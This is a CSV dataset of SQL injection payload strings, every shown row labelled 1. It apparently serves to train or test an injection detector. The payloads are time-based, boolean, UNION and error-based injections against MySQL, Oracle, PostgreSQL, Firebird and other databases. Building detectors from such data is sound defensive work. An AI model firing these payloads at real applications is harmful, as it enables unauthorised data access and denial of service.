Sentence,Label
"1'+  (  select 'asmj' where 7818  =  7818 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  113  )  ,5   )    )   +'",1
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1
-2951 or 4189  =  2291,1
"1' in boolean mode  )   or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )   #",1
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   ",1
1'||  (  select 'ytwz' from dual where 3125  =  3125 and   (  5139  =  5313  )  *5313  )  ||',1
end and   (  9416  =  9416,1
"1%'  )   union all select null,null,null,null#",1
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 1 end  )   limit 1--",1
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1
"1"" where 4298  =  4298 order by 1--",1
-1468'   )    )     )   or 4875  =  6163#,1
"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  111  )  ||chr  (  68  )  ,5  )  --",1
-3162'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1
"-1417 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1
"-1371'   )    )     )   or elt  (  1132  =  1132,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1
"1%"" and 8417  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )    and ""%""  =  """,1
"-9519  )   union all select 1193,1193,1193#",1
"1""   )    )    as azak where 4911  =  4911",1
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1
"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",1
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
1'   )    )     )   and 4595  =  4595#,1
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  91  )  ||chr  (  119  )  ,5  )  --",1
"1""  )   as ymto where 3453  =  3453",1
"-7321""  )   where 3917  =  3917 union all select 3917,3917--",1
"1 procedure analyse  (  extractvalue  (  5841,concat  (  1x5c,1x7171716a71,  (  select   (  case when   (  5841  =  5841  )   then 1 else 1 end   )    )   ,1x717a767a71   )    )   ,1  )  # mafe",1
"-1663' or elt  (  1132  =  1132,3623  )   and 'yqaj' like 'yqaj",1
-3578'   )    )     )   order by 1--,1
"1%'   )    )     )   union all select null,null,null#",1
"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",1
"1'   )    )     )   or row  (  1145,7562  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  1145  =  1145,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3151 union select 1211  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1
"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1
"-3834'   )    )     )   union all select 8313,8313--",1
-8248 or 5913  =    (  'qqpjq'||  (  select case 5913 when 5913 then 1 else 1 end from rdb$database  )  ||'qzvzq'  ) ,1
"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1' where 8951  =  8951 or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1' where 3711  =  3711 and 2116  =  2116,1
"-1668""   )    )     )   or 9323  =  9323#",1
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 1x28 end   )    )    and   (  ""hnnf"" like ""hnnf",1
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1
"1'  )   where 8255  =  8255 or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1
"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1818,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  1818  =  1818,1   )    )     )  ,1x717a767a71  )  ,8666   )    )   +'",1
-2217%'  )   or   (  8459  =  8459  )  *4916 and   (  '%'  =  ',1
"1""  )   or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1
"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1
"select count  (  *  )   from generate_series  (  1,5111111  )   and   (  8997  =  8997",1
-7611' or 3138  =  3138,1
1'||  (  select 'gmkp' where 6116  =  6116,1
"1,  (  case when 6621  =  3192 then 1 else null end  )  ",1
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
"1  )   and elt  (  1211  =  1211,sleep  (  5   )    )   ",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  111  )  ,5  )   from dual and    (    (   7241  =  7241",1
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1
"-8121'   )    )    or 5123  =  ctxsys.drithsx.sn  (  5123,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  5123  =  5123  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1
"1%""  )   or row  (  1145,7562  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  1145  =  1145,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3151 union select 1211  )  a group by x  )   and   (  ""%""  =  """,1
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 1 from dual  )   end  )   from dual  )  ",1
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1
-6191'   )    )     )   union all select 9413--,1
"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-4653' or 1 group by concat  (  1x7171716a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 1 end   )    )   ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )    having min  (  1  )  #",1
1'   )    )    and 6691  =  3251#,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1
select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 1  )   end  )  --,1
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1
"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 1 end  )   limit 1--",1
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",1
"1"" or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-5591%""   )    )    order by 1--",1
1'  )   where 4949  =  4949,1
"1""   )    )    as sqow where 8752  =  8752",1
"1  )   where 8118  =  8118 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""  )   as frmp where 6173  =  6173",1
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x52515a51   )    )      )    )     )  ,1  )  ",1
-2411 or   (  8459  =  8459  )  *4916# pxwg,1
"1"" and 6155  =  ctxsys.drithsx.sn  (  6155,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  6155  =  6155  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1%"" union all select null,null,null--",1
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1
select   (  case when   (  3716  =  4121  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1
"-2111' union all select 1161,1161,1161--",1
"1""   )    )    and 3581  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-8161""  )   where 5291  =  5291 or 5913  =    (  'qqpjq'||  (  select case 5913 when 5913 then 1 else 1 end from rdb$database  )  ||'qzvzq'  )  --",1
"-5171'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",1
1' where 5113  =  5113,1
"-8771""   )    )    union all select 6312,6312,6312,6312,6312#",1
"1,  (  select   (  case when   (  8641  =  8641  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8641  )  ,1  )  ,511111111  )  ,null   )    )     )   else 8641/  (  select 1 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1
"-1573""  )   union all select 3928,3928,3928,3928--",1
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1
1  )   where 7196  =  7196,1
-3166'||  (  select 'mtan' from dual where 9421  =  9421 union all select 9421#,1
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3169  =  3169,1
1 where 4787  =  4787,1
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8191  =  8191,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )   ",1
"-4635"" union all select 5187,5187,5187,5187,5187,5187,5187,5187,5187,5187#",1
"1""   )    )    or char  (  75  )  ||char  (  71  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )  --",1
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1
"1'   )    )     )   and 3212  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg",1
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )   --",1
"-5124%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """,1
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh",1
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )  # couj",1
"1%' and make_set  (  8413  =  8413,8899  )   and '%'  =  '",1
"1   )    )     )   and 9661  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1
"1'||  (  select 'hdpi' where 5621  =  5621 and make_set  (  8413  =  8413,8899   )    )   ||'",1
"1' or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )   ",1
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  91  )  ||chr  (  119  )  ,5  )  --",1
"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",1
"1' where 3339  =  3339 and 3824  =  benchmark  (  5111111,md5  (  1x76555642   )    )   --",1
select   (  case when   (  2156  =  1917  )   then 2156 else 1/  (  select 1  )   end  )  --,1
"1%""   )    )    or sleep  (  5  )  #",1
" end and    (    (     (  ""revx""  =  ""revx",1
"1%' union all select null,null,null,null--",1
"1%' or char  (  119  )  ||char  (  111  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,1  )  ,5111111111  )  ,null  )  --",1
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,1  )  ,511111111  )  ,null  )   else char  (  118  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,1x717a767a71   )    )   --",1
select case when 8867  =  7631 then 1 else null end--,1
-4331  )   as inpx where 9814  =  9814 union all select 9814#,1
"select benchmark  (  5111111,md5  (  1x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1
"1   )    )    and 8417  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )    and    (    (   4451  =  4451",1
"-4596"" union all select 5761#",1
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8191  =  8191,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )   --",1
"-6419 union all select 7118,7118,7118,7118,7118--",1
"-9181"" or 1 group by concat  (  1x7171716a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 1 end   )    )   ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )    having min  (  1  )  #",1
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-3361 where 1335  =  1335 or elt  (  5891  =  5192,5192  )  --",1
